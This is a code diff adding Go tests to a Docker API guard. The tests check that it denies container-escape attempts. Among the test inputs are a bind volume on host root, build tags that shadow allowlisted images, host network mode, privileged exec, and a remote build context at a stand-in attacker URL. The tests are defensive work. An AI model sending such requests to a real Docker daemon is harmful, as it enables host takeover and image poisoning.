@@ -11,15 +11,56 @@ import (
 	"github.com/vossi/bw-docker-guard/internal/ownership"
 )
 
+// testVolumes is the fake daemon volume set the guard's named-volume lookup
+// sees in tests. A name absent from it does not exist on the daemon, which is
+// the ordinary case: the daemon would create a plain local volume.
+var testVolumes = map[string]*VolumeInfo{
+	// An ordinary Docker-managed volume.
+	"proj_data": {Driver: "local", Mountpoint: "/var/lib/docker/volumes/proj_data/_data"},
+	// The BWAICODE-4 attack: a local-driver bind volume pointing at host root.
+	"hostroot_vol": {
+		Driver:     "local",
+		Mountpoint: "/",
+		Options:    map[string]string{"type": "none", "device": "/", "o": "bind"},
+	},
+	// A local-driver bind volume pointing INTO the project, which is allowed.
+	"inproject_vol": {
+		Driver:     "local",
+		Mountpoint: "/project/data",
+		Options:    map[string]string{"type": "none", "device": "/project/data", "o": "bind"},
+	},
+	// A remote mount: the device is not an absolute host path.
+	"nfs_vol": {
+		Driver:  "local",
+		Options: map[string]string{"type": "nfs", "device": ":/export", "o": "addr=10.0.0.1"},
+	},
+	// A third-party volume plugin: backing unknown to this guard.
+	"plugin_vol": {Driver: "some-storage-plugin", Mountpoint: "/mnt/whatever"},
+}
+
+// fakeVolumeLookup serves VolumeInfo from vols; an unknown name reports "does
+// not exist" the way a 404 from the daemon does.
+func fakeVolumeLookup(vols map[string]*VolumeInfo) VolumeLookup {
+	return func(name string) (*VolumeInfo, error) {
+		v, ok := vols[name]
+		if !ok {
+			return nil, nil
+		}
+		return v, nil
+	}
+}
+
 func newTestValidator() (*Validator, *ownership.Tracker) {
 	cfg := &config.Config{
 		ProjectDir:      "/project",
-		AllowedImages:   []string{"postgres:16", "mcp/postgres", "redis:7"},
+		AllowedImages:   []string{"postgres:16", "mcp/postgres", "redis:7", "myproj-app"},
+		BuildableImages: []string{"myproj-app"},
 		AllowedNetworks: []string{"mynet", "backend"},
 		VolumeMountRoot: "/project",
 	}
 	tracker := ownership.New()
 	v := NewValidator(cfg, tracker)
+	v.SetVolumeLookup(fakeVolumeLookup(testVolumes))
 	return v, tracker
 }
 
@@ -353,6 +394,7 @@ func TestValidateContainerCreate(t *testing.T) {
 	}
 	tracker := ownership.New()
 	v := NewValidator(cfg, tracker)
+	v.SetVolumeLookup(fakeVolumeLookup(testVolumes))
 
 	tests := []struct {
 		name   string
@@ -1023,12 +1065,29 @@ func TestReadOnlyDeniesPreownedContainerActions(t *testing.T) {
 // allowed in guarded mode". That is CAF-001 step 1: the tag is how the
 // attacker mints an infra-looking image name. Inverted here.
 func TestValidateBuildTagMustBeAllowlisted(t *testing.T) {
-	v, _ := newTestValidator() // allows postgres:16, mcp/postgres, redis:7
+	// newTestValidator allows postgres:16, mcp/postgres, redis:7 and
+	// myproj-app as IMAGES, but only myproj-app as a BUILD tag.
+	v, _ := newTestValidator()
 
-	t.Run("build tagged as an allowlisted image is allowed", func(t *testing.T) {
-		r := makeRequest("POST", "/v1.45/build?t=postgres:16", "")
-		if d := v.Validate(r); !d.Allow {
-			t.Errorf("allowlisted build tag should be allowed, got deny: %s", d.Reason)
+	t.Run("build tagged as a buildable image is allowed", func(t *testing.T) {
+		for _, tag := range []string{"myproj-app", "myproj-app:latest"} {
+			r := makeRequest("POST", "/v1.45/build?t="+tag, "")
+			if d := v.Validate(r); !d.Allow {
+				t.Errorf("buildable tag %q should be allowed, got deny: %s", tag, d.Reason)
+			}
+		}
+	})
+
+	t.Run("build shadowing a pullable allowlisted image is denied", func(t *testing.T) {
+		// BWAICODE-2: postgres:16 is in the IMAGE allowlist, so this used to
+		// be allowed. Docker then resolves postgres:16 from the local cache
+		// ahead of a registry pull, so every later create of postgres:16 runs
+		// what this build produced.
+		for _, tag := range []string{"postgres:16", "postgres:evil", "postgres", "mcp/postgres"} {
+			r := makeRequest("POST", "/v1.45/build?t="+tag, "")
+			if d := v.Validate(r); d.Allow {
+				t.Errorf("build tag %q allowed: a build must not be able to shadow a pullable image", tag)
+			}
 		}
 	})
 
@@ -1054,7 +1113,7 @@ func TestValidateBuildTagMustBeAllowlisted(t *testing.T) {
 	})
 
 	t.Run("every tag is checked, not just the first", func(t *testing.T) {
-		r := makeRequest("POST", "/v1.45/build?t=postgres:16&t=moby/buildkit:pwn", "")
+		r := makeRequest("POST", "/v1.45/build?t=myproj-app&t=moby/buildkit:pwn", "")
 		if d := v.Validate(r); d.Allow {
 			t.Error("a second, non-allowlisted tag must still be denied")
 		}
@@ -1393,4 +1452,90 @@ func TestValidateOversizedBody(t *testing.T) {
 	if !strings.Contains(strings.ToLower(d.Reason), "body") {
 		t.Errorf("reason should mention body, got: %s", d.Reason)
 	}
+}
+
+// --- BWAICODE-5: the build query string and the exec create body ---
+
+func TestValidateBuildQueryString(t *testing.T) {
+	v, _ := newTestValidator() // buildable: myproj-app
+
+	t.Run("host network mode is denied on the build path too", func(t *testing.T) {
+		// Captured live: `docker build --network host` sends
+		// POST /build?networkmode=host&t=... The create path denies
+		// NetworkMode host, so the build path must not be a way around it.
+		for _, nm := range []string{"host", "container:abc"} {
+			r := makeRequest("POST", "/v1.45/build?t=myproj-app&networkmode="+nm, "")
+			if d := v.Validate(r); d.Allow {
+				t.Errorf("build with networkmode=%s allowed; the create path denies it", nm)
+			}
+		}
+	})
+
+	t.Run("benign network modes still build", func(t *testing.T) {
+		for _, nm := range []string{"", "default", "bridge", "none"} {
+			r := makeRequest("POST", "/v1.45/build?t=myproj-app&networkmode="+nm, "")
+			if d := v.Validate(r); !d.Allow {
+				t.Errorf("build with networkmode=%q denied: %s", nm, d.Reason)
+			}
+		}
+	})
+
+	t.Run("remote build context is denied", func(t *testing.T) {
+		// ?remote=URL makes the DAEMON fetch a context from a caller-chosen
+		// URL: a server-side request issued by the thing the guard mediates.
+		r := makeRequest("POST", "/v1.45/build?t=myproj-app&remote=http://attacker.example/ctx.tar", "")
+		if d := v.Validate(r); d.Allow {
+			t.Error("build with a remote context URL allowed")
+		}
+	})
+
+	t.Run("an unreasoned build parameter fails closed", func(t *testing.T) {
+		r := makeRequest("POST", "/v1.45/build?t=myproj-app&somefutureparam=1", "")
+		if d := v.Validate(r); d.Allow {
+			t.Error("an unknown build parameter was allowed; the policy must be deny-by-default")
+		}
+	})
+
+	t.Run("the parameters a real docker build sends are permitted", func(t *testing.T) {
+		// Captured verbatim from docker 29.7.2 through a logging proxy.
+		reals := []string{
+			"dockerfile=Dockerfile&t=myproj-app&version=1",
+			"buildargs=%7B%22X%22%3A%221%22%7D&dockerfile=Dockerfile&labels=%7B%22l%22%3A%221%22%7D&nocache=1&pull=1&t=myproj-app&version=1",
+		}
+		for _, q := range reals {
+			r := makeRequest("POST", "/v1.45/build?"+q, "")
+			if d := v.Validate(r); !d.Allow {
+				t.Errorf("a real docker build was denied (%s): %s", q, d.Reason)
+			}
+		}
+	})
+}
+
+func TestValidateExecCreateBodyFailsClosed(t *testing.T) {
+	v, tracker := newTestValidator()
+	tracker.Add("mine")
+
+	t.Run("a real docker exec body is allowed", func(t *testing.T) {
+		// Captured verbatim from docker 29.7.2.
+		body := `{"User":"","Privileged":false,"Tty":false,"AttachStdin":false,` +
+			`"AttachStderr":true,"AttachStdout":true,"DetachKeys":"","Env":null,` +
+			`"WorkingDir":"","Cmd":["echo","hi"]}`
+		if d := v.Validate(makeRequest("POST", "/v1.45/containers/mine/exec", body)); !d.Allow {
+			t.Errorf("a real docker exec body was denied: %s", d.Reason)
+		}
+	})
+
+	t.Run("an unreasoned exec field is denied", func(t *testing.T) {
+		body := `{"Cmd":["sh"],"SomeFutureField":{"grants":"something"}}`
+		if d := v.Validate(makeRequest("POST", "/v1.45/containers/mine/exec", body)); d.Allow {
+			t.Error("an unknown exec create field was allowed; the body used to be parsed permissively")
+		}
+	})
+
+	t.Run("privileged exec is still denied", func(t *testing.T) {
+		body := `{"Cmd":["sh"],"Privileged":true}`
+		if d := v.Validate(makeRequest("POST", "/v1.45/containers/mine/exec", body)); d.Allow {
+			t.Error("privileged exec allowed")
+		}
+	})
 }
